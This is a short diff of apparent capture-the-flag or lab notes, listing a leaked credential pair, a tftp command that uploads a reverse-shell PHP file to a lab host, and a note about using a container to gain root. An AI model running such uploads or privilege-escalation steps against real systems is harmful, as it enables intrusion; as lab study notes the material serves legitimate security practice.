@@ -79,3 +79,6 @@ mike:Sheffield19
 
 
 tftp 10.129.132.172 -m binary -c put revShell.php revShell.php
+
+* It seems like I will be making a container so that I can open it with root privilege.  
+
